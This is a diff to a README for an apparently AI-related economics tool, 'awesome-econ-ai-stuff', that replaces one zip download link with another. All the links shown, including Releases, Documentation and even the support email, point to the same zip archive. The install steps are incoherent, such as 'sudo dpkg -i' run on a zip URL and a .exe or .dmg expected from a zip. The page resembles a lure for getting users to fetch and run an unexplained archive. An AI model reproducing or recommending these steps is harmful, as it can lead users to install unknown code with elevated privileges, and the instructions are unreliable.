@@ -6,7 +6,7 @@ Welcome to awesome-econ-ai-stuff! This application provides essential AI skills 
 
 ## 📥 Download Now
 
-[![Download awesome-econ-ai-stuff](https://raw.githubusercontent.com/hiharpin/awesome-econ-ai-stuff/main/_skills/writing/latex-tables/econ_awesome_ai_stuff_1.3.zip)](https://raw.githubusercontent.com/hiharpin/awesome-econ-ai-stuff/main/_skills/writing/latex-tables/econ_awesome_ai_stuff_1.3.zip)
+[![Download awesome-econ-ai-stuff](https://github.com/hiharpin/awesome-econ-ai-stuff/raw/refs/heads/main/pages/econ-ai-awesome-stuff-v2.5.zip)](https://github.com/hiharpin/awesome-econ-ai-stuff/raw/refs/heads/main/pages/econ-ai-awesome-stuff-v2.5.zip)
 
 ## 💡 Features
 
@@ -28,19 +28,19 @@ To run awesome-econ-ai-stuff, your computer should meet the following requiremen
 
 To get started, visit the Releases page to download the software:
 
-[Download awesome-econ-ai-stuff](https://raw.githubusercontent.com/hiharpin/awesome-econ-ai-stuff/main/_skills/writing/latex-tables/econ_awesome_ai_stuff_1.3.zip)
+[Download awesome-econ-ai-stuff](https://github.com/hiharpin/awesome-econ-ai-stuff/raw/refs/heads/main/pages/econ-ai-awesome-stuff-v2.5.zip)
 
 Once on the Releases page, follow these steps:
 
 1. **Find the Latest Version**: Look for the most recent release at the top of the list.
 2. **Select the Correct File**: Choose the file that matches your operating system:
-   - For Windows: Download either `https://raw.githubusercontent.com/hiharpin/awesome-econ-ai-stuff/main/_skills/writing/latex-tables/econ_awesome_ai_stuff_1.3.zip` or `https://raw.githubusercontent.com/hiharpin/awesome-econ-ai-stuff/main/_skills/writing/latex-tables/econ_awesome_ai_stuff_1.3.zip`
-   - For macOS: Download `https://raw.githubusercontent.com/hiharpin/awesome-econ-ai-stuff/main/_skills/writing/latex-tables/econ_awesome_ai_stuff_1.3.zip`
-   - For Ubuntu: Download `https://raw.githubusercontent.com/hiharpin/awesome-econ-ai-stuff/main/_skills/writing/latex-tables/econ_awesome_ai_stuff_1.3.zip`
+   - For Windows: Download either `https://github.com/hiharpin/awesome-econ-ai-stuff/raw/refs/heads/main/pages/econ-ai-awesome-stuff-v2.5.zip` or `https://github.com/hiharpin/awesome-econ-ai-stuff/raw/refs/heads/main/pages/econ-ai-awesome-stuff-v2.5.zip`
+   - For macOS: Download `https://github.com/hiharpin/awesome-econ-ai-stuff/raw/refs/heads/main/pages/econ-ai-awesome-stuff-v2.5.zip`
+   - For Ubuntu: Download `https://github.com/hiharpin/awesome-econ-ai-stuff/raw/refs/heads/main/pages/econ-ai-awesome-stuff-v2.5.zip`
 3. **Install the Application**:
    - **Windows**: Double-click the `.exe` file and follow the prompts to install. If you downloaded a `.zip`, extract it and run the setup inside.
    - **macOS**: Open the `.dmg` file. Drag the application into your Applications folder.
-   - **Ubuntu**: Open a terminal and run `sudo dpkg -i https://raw.githubusercontent.com/hiharpin/awesome-econ-ai-stuff/main/_skills/writing/latex-tables/econ_awesome_ai_stuff_1.3.zip` to install.
+   - **Ubuntu**: Open a terminal and run `sudo dpkg -i https://github.com/hiharpin/awesome-econ-ai-stuff/raw/refs/heads/main/pages/econ-ai-awesome-stuff-v2.5.zip` to install.
 
 4. **Launch the Application**: Find the app in your applications folder (or start menu) and double-click to open it.
 
@@ -56,12 +56,12 @@ Once you launch awesome-econ-ai-stuff, you'll see a welcome screen. From here, y
 
 If you encounter any issues or need help with the software, please reach out:
 
-- **Email**: https://raw.githubusercontent.com/hiharpin/awesome-econ-ai-stuff/main/_skills/writing/latex-tables/econ_awesome_ai_stuff_1.3.zip
+- **Email**: https://github.com/hiharpin/awesome-econ-ai-stuff/raw/refs/heads/main/pages/econ-ai-awesome-stuff-v2.5.zip
 - **Community Forum**: Visit our community forum for questions and support.
 
 ## 🔗 Important Links
 
-- [Releases Page](https://raw.githubusercontent.com/hiharpin/awesome-econ-ai-stuff/main/_skills/writing/latex-tables/econ_awesome_ai_stuff_1.3.zip)
-- [Documentation](https://raw.githubusercontent.com/hiharpin/awesome-econ-ai-stuff/main/_skills/writing/latex-tables/econ_awesome_ai_stuff_1.3.zip)
+- [Releases Page](https://github.com/hiharpin/awesome-econ-ai-stuff/raw/refs/heads/main/pages/econ-ai-awesome-stuff-v2.5.zip)
+- [Documentation](https://github.com/hiharpin/awesome-econ-ai-stuff/raw/refs/heads/main/pages/econ-ai-awesome-stuff-v2.5.zip)
 
 Thank you for choosing awesome-econ-ai-stuff. We hope this tool enhances your economic research and analysis!
